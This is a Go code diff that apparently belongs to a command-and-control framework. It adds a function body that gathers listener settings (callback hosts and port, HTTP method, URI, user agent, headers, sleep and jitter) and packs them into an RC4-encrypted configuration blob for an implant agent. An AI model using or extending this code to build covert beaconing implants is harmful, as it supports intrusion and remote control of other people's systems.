@@ -7,6 +7,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"hash/crc32"
 	"math/rand"
 	"strconv"
 	"strings"
@@ -49,6 +50,82 @@ func CreateAgentProfile(agentConfig string, listenerProfile []byte) ([]byte, err
 		if err != nil {
 			return nil, err
 		}
+
+		table := crc32.MakeTable(crc32.IEEE)
+		agentCrc := int(crc32.Checksum([]byte(SetName), table))
+
+		portAgentStr, _ := listenerMap["callback_port"].(string)
+		PortAgent, _ := strconv.Atoi(portAgentStr)
+
+		var HostsAgent []string
+		hosts_agent, _ := listenerMap["hosts_agent"].([]any)
+		for _, value := range hosts_agent {
+			HostsAgent = append(HostsAgent, value.(string))
+		}
+		c2Count := len(HostsAgent)
+
+		HttpMethod, _ := listenerMap["http_method"].(string)
+		Ssl, _ := listenerMap["ssl"].(bool)
+		Uri, _ := listenerMap["urn"].(string)
+		ParameterName, _ := listenerMap["hb_header"].(string)
+		UserAgent, _ := listenerMap["user_agent"].(string)
+		RequestHeaders, _ := listenerMap["request_headers"].(string)
+
+		WebPageOutput, _ := listenerMap["page-payload"].(string)
+		ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
+		ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])
+
+		encrypt_key, _ := listenerMap["encrypt_key"].(string)
+		encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
+		if err != nil {
+			return nil, err
+		}
+
+		seconds, err := parseDurationToSeconds(generateConfig.Sleep)
+		if err != nil {
+			return nil, err
+		}
+
+		params = append(params, agentCrc)
+		params = append(params, Ssl)
+		params = append(params, PortAgent)
+		params = append(params, c2Count)
+		for i := 0; i < c2Count; i++ {
+			params = append(params, HostsAgent[i])
+		}
+		params = append(params, HttpMethod)
+		params = append(params, Uri)
+		params = append(params, ParameterName)
+		params = append(params, UserAgent)
+		params = append(params, RequestHeaders)
+		params = append(params, ansOffset1)
+		params = append(params, ansOffset2)
+		params = append(params, seconds)
+		params = append(params, generateConfig.Jitter)
+
+		packedParams, err := PackArray(params)
+		if err != nil {
+			return nil, err
+		}
+
+		cryptParams, err := RC4Crypt(packedParams, encryptKey)
+		if err != nil {
+			return nil, err
+		}
+
+		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
+		packedProfile, err := PackArray(profileArray)
+		if err != nil {
+			return nil, err
+		}
+
+		result := ""
+		for _, b := range packedProfile {
+			result += fmt.Sprintf("\\x%02x", b)
+		}
+		fmt.Println(result)
+
+		//////////////////////
 
 	}
 
